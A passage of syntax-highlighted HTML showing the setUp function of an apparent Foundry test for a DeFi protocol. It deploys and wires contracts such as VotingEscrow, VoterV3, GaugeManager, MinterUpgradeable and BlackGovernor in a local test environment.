\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xAD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRoleFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDepositor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 